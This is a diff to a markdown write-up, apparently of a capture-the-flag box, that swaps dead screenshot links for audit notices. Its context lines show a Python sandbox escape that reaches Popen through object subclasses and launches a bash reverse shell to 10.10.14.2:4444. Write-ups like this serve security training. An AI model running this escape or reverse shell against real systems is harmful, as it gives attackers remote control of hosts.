@@ -144,7 +144,10 @@ Vary: Cookie
 </body>
 </html>
 ```
-![image](https://github.com/user-attachments/assets/7daa1b50-b5ea-40b0-87ef-dd54c9c3b492)
+
+
+> **Unavailable screenshot:** image. [Original GitHub attachment](https://github.com/user-attachments/assets/7daa1b50-b5ea-40b0-87ef-dd54c9c3b492) returned 404 during the image audit (2026-10-08).
+
 
 ## Python
 This will show all available sub-classes
@@ -168,7 +171,10 @@ for i, x in enumerate((()).__class__.__base__.__subclasses__()):
     except:
         pass
 ```
-![image](https://github.com/user-attachments/assets/29800e9d-b986-4845-addd-9873cef02bd1)
+
+
+> **Unavailable screenshot:** image. [Original GitHub attachment](https://github.com/user-attachments/assets/29800e9d-b986-4845-addd-9873cef02bd1) returned 404 during the image audit (2026-10-08).
+
 
 Woot!\
 Now we can directly target popen by id!
@@ -192,7 +198,10 @@ cls = ().__class__.__base__.__subclasses__()[317]
 cls(["bash","-c","bash -i >& /dev/tcp/10.10.14.2/4444 0>&1"], stdout=-1).communicate()
 ```
 
-![image](https://github.com/user-attachments/assets/dbdd2d81-df70-4428-8e2d-aa92640a4502)\
+
+> **Unavailable screenshot:** image. [Original GitHub attachment](https://github.com/user-attachments/assets/dbdd2d81-df70-4428-8e2d-aa92640a4502) returned 404 during the image audit (2026-10-08).
+
+
 Success!!
 
 Let us stabilize
@@ -299,7 +308,6 @@ class User(db.Model):
     username = db.Column(db.String(80), unique=True, nullable=False)
     password = db.Column(db.String(80), nullable=False)
     codes = db.relationship('Code', backref='user', lazy=True)
-
 
 
 class Code(db.Model):
@@ -543,8 +551,6 @@ the json file\
 	]
 }
 ```
-
-
 
 
 > SCRATCH THAT...GOT THE SOLUTION
